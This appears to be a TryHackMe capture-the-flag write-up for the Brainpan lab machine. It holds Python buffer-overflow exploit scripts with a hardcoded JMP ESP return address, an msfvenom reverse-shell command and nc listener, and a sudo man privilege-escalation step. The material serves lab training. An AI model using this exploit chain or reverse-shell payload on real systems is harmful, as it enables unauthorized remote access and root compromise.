# Brainpane


## Buffer Overflow machine from THM. 
![brainpan1](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/thm-page1.png)


### Recon

Lets start our enumeration phase with the following `nmap` scan.

```bash
nmap -sC -sV -p- -A 10.10.112.138 -oN nmap.result
```

Here are the results:

![nmap-results3](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/nmap-results3.png)


We have three ports,
+ port 8250 is filtered (a false positive)
+ port 9999 appears to be serving an unkown service 
+ port 10000 is a Python server.

Lets connect to the Python server first, and see what iwe can gather. 	


### Python Server

Lets open our browser and navigate to the following URL `http://10.10.112.138:10000/`

![python-server4](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/pythonserver4.png)


This is a simple HTML page, nothing to interact with. Must be hidden content somewhere, 
lets perfrom directory busting. For this task lets use `wfuzz`

```bash
wfuzz --hc 400,404 -c -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/
directory-list-2.3-medium.txt http://10.10.34.167:10000/FUZZ
```

We got a redirect on a 'bin' directory: 

![wfuzz5](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/wfuxx-5.png)


Lets navigate to this directory `http://10.10.112.138:10000/bin/`

![bin-folder6](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/bin-folder6.png)


We have a windows executable here, It looks like the custom service running on port 9999:

![custom-7](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/custom7.png)


Lets download this exe and see if we can break it offline. 


## Buffer Overflow

I have a windows machine with Immunity Debugger at 192.168.60.15, lets transfer the .exe to this machine,
and run the .exe as admin: 

![exe8](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/exe8.png)


Run Immunity Debugger as admin and attach the service: 

![attach9](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/attach9.png)


Should look like this:

![debugger10](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/debugger10.png)


Lets start spiking! 


### Spiking

The only thing we can do when we connect to the service is input a password. There are no 
commands, or a help manual. So lets see if we can overflow this input parameter. 

We need to design a spiking script for `generic_send_tcp`. Here is what i came up with: 

```bash
s_readline();
s_readline("0");
```

Thats all we need for now, lets run it:

```bash
generic_send_tcp 192.168.60.15 9999 brain.spk 0 0
```

After a few seconds the target service crashed, Lets check the Debugger:

![first-crash12](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/first-crash12.png)


Wev'e sucsesfully overwritten the EIP, now we need to figure out the size of the buffer. 


### Fuzzing 

Lets create a fuzzing script to hunt down the crash point of the server:

```python
import socket, sys
from time import sleep

buffer = b'A' * 100

while True:
	try:
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect(('192.168.60.15', 9999))
		
		conn.sendall(buffer)
		conn.close()
		sleep(1)
	
	except:
		print(f'Server crashed at {len(buffer)} bytes')
		sys.exit()
```

This will send 100 'A' characters to the server's buffer, incrementing it by 100 every iteration 
to see at which point approximately the server crashes. 

Lets give it a go. After several times, the server repeatedly kept crashing at around 600 bytes to the buffer:

![crashed-fuzzing13](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/fuzzing-crashed13.png)


The EIP got overwritten and we even went past it. 

![crashed-debugger14](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/debugger-crashed14.png)


Now we want to fnd the distance of the EIP register relative to the start of our buffer in bytes. 
This is called the offset. 


## Finding the Offset

For this we are going to use a ruby tool called `pattern_create`, i highly recommend setting an alias
to shorten the path. 

```bash
alias pattern_create=/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
```

Now, we supply the approximate buffer size that crashes the server (found in the previous step),
and `pattern_create` will generate a payload that will help capture the EIP offset.  

`pattern_create -l 600`

![pattern_create15](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/pattern_create15.png)


Place this output in our script:

![script16](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/script16.png)


Lets execute, and check the Dubugger:

![debugger-crashed17](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/debugger-crashed17.png)


Now wev'e overwritten past the EIP, Lets take the value in the EIP and calculate the offset.
To find the exact offset, we need a second tool called `pattern_offset`, same location:  

```bash
alias pattern_offset=/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

We need to supply the size of the previously generated pattern, and the value in the EIP
register and we should get the exact size of the offset: 

`pattern_offset -l 600 -q 35724134`

![pattern_offset18](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/pattern_offset18.png)


Now that we know the location of the EIP, we can start overwriting it. 


### Overwriting the EIP


We need to send 524 bytes to get to the EIP, then the EIP itself is 4 bytes long. 
We should validate that.

Lets send 524 'A' characters exactly, than 4 'B' characters. If our calculation are correect, 
the EIP should have a value of 42424242 (The 4 B's in hex).


```python
import socket, sys

buffer = b'A' * 524
eip = b'B' * 4
payload = buffer + eip


try:
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	conn.connect(('192.168.60.15', 9999))
		
	conn.sendall(payload)
	conn.close()
	
except Exception as e:
	print(e)
	sys.exit()
```

Lets execute the script and check the debugger: 

![deubbger-validate19](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/debugger-validate19.png)


Great! Our calculation were correct.  Now its time to find the bad characters.


### Finding Bad Characters

We need to identify any characters that may cause issues to our target program runtime,
using these characters in our final shellcode will break it. 


To do this we need a list of all possible hex values, you can find it [here](https://github.com/cytopia/badchars). 
We need the Python syntax: 

![badchars20](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/badchars20.png)


Copy this blob to our script, and add it to our payload:


```python
import socket, sys

badchars = <past badchars here>
buffer = b'A' * 524
eip = b'B' * 4
payload = buffer + eip + badchars


try:
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	conn.connect(('192.168.60.15', 9999))
		
	conn.sendall(payload)
	conn.close()
	
except Exception as e:
	print(e)
	sys.exit()
```


Lets execute it and check the debugger:

![badchars-debugger21](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/badchars-debugger21.png)


Looks good, now we need to right click the ESP register and select â€œFollow in Dump": 

![follow-in-dump22](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/follow-in-dump22.png)

Here, we want to go over the dump and make sure every single character is in the dump and in order. 
Here is the start of the buffer: 

![start-buffer23](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/start-buffer23.png)


Below is the end of the buffer and the start of the EIP register: 

![start-eip24](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/start-eip24.png)


Following that we can see our badchars chunk of data we sent. In the middle are the Hex values,
lets make sure every single character is there, and there are no duplicates or anything funny. 
												
Looks good to me,  Everything is here: 

![badchars-final25](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/badchars-final25.png)


Lets move on to finding the the right module. 


### Finding the Right Module

In this stage, we want to analyize the libraries our target program is using. 

Specifically, we want to identify libraries with minimal memory protections that executes a 
specific assembly instruction. 

The instruction is `JMP ESP`, which instructs the program to jump to a memory location of our 
choocing, essentially hijacking the memory. The hex representation for this instruction is 
called an opcode. 

In order to examine program libraries we need to add an extension to Immnity Debugger called 
`mona-modules`,  you can find it [here](https://github.com/corelan/mona). 

Based on the github page, we need to download the mona.py file, and place it in the
following path: `This PC\Local Disk(C:)\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`

Once we have the plugin, we can start the debugger, attach the service, and type the following in the command bar: 
`!mona modules`

![mona-modules26](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/mona-modules26.png)

A new screen will appear. In it, we get a table of the different libraries being used by the target.  													
We can see one entry that has `False` across the board in terms of memory protections, 
and its the brainpan service itself `brainpan.exe` :

![brain-module27](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/brain-module27.png)


All other DLL's have protections, so we should focus on the executable itself and find the 
opcode for the `JMP ESP` instruction. 

To do this we need to use a tool called `nasm_shell`. 

```bash
alias nasm_shell=/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
``` 

Lets run it: 

![nasm28](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/nasm28.png)

Thats what we need, FFE4  is the opcode for the instrcution (0xFF, 0xE4, two bytes).
Lets search for this specific opcode in the Debugger with the following command: 
`!mona find -s '\xff\xe4' -m brainpan.exe`

This gives us the memory address for the instruction:

![mona-find28](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/mona-find28.png)


Instruction is at 311712F3. This is where we will point the EIP register.  


### Testing the Opcode

Lets test if we can sucsesfully overwrite the EIP register with the return adderss we found in 
the previous step. 

First, lets add the return address to our script:


```python
import socket, sys

buffer = b'A' * 524
opcode = b'\xf3\x12\x17\x31' 	 # Return address is 311712f3, but is sent backwards
payload = buffer + opcode


try:
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	conn.connect(('192.168.60.15', 9999))
		
	conn.sendall(payload)
	conn.close()
	
except Exception as e:
	print(e)
	sys.exit()
```


Notice the return address is backwards, this is becasue x86 machines are little endian, 
which means they store the least significant bit first, so binary values are handled in revrese. 

Next, we need to find this return address in the binary, and set a breakpoint on this address.
Open the debugger: 

![breakp29](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/breakp29.png)


Click the highlighted button and input the return address weve found. 
Then press F2 and it will highlight as a breakpoint: 

![breakp30](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/breakp30.png)


We should be good to go, Lets start the service and run our script, and see what happens:

![breakp-results31](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/breakp-results31.png)


Our breakpoint was hit, and the EIP is fully overwritten with the return address. Perfect. 
Now all we need is some shellcode to jump to. 


### Genereting Shellcode and Getting a Shell

This is the last stage in our exploit development, lets use `msfvenom` to generate a reverse shell: 

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.18.22.182 LPORT=9001 EXITFUNC=thread -f python -a x86 -b '\x00'`

![venom32](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/venom32.png)

Take this output and place it in our script: 


```python
import socket, sys

buf = <place venom here>
padding = b'\x90' * 32
buffer = b'A' * 524
opcode = b'\xf3\x12\x17\x31'

payload = buffer + opcode + padding + buf


try:
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	conn.connect(('192.168.60.15', 9999))
		
	conn.sendall(payload)
	conn.close()
	
except Exception as e:
	print(e)
	sys.exit()
```


Set up the listener: `nc -lnvp 9001`

Run the final script: `./brainpan.py`

And we get a shell: 

![shell33](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/shell33.png)


Once inside just run the below command to spwan a tty shell:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![tty34](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/tty34.png)


Lets move to privilege escalation! 



## Privilege Escalation

When we list our home directory's contents we can see the following: 

![home-dir35](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/home-dir35.png)


The `checksrv.sh` script stands out, but its not the way forward. In short, it checks if the 
brainpan service is alive, and restarts it (using wine) if its not. Same for the Python server.

Nothing super interesting at the moment, lets check our SUDO privileges, `sudo -l`:

![sudo36](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/sudo36.png)


We can run this /home/anansi/bin/anansi_util program, but we have no permissions at all 
towards this program:

![sudo-perm36](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/sudo-perm36.png)


If we run the program: 

![run-sudo37](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/run-sudo37.png)


We have three options, each runs a diffrent command on the system. â€œnetworkâ€ runs `ifconfig`, 
â€œproclistâ€ runs `top`, and â€œmanualâ€ runs `man`. 

If we can run `man` as root, we can escalate our priovleges easily, as `man` supports command execution: 
[source](https://gtfobins.github.io/gtfobins/man/)

![gtfo-bins38](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/gtfo-bins38.png)


Therfore getting a root shell is trivial: 

![root39](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/brainpan1/img/root39.png)
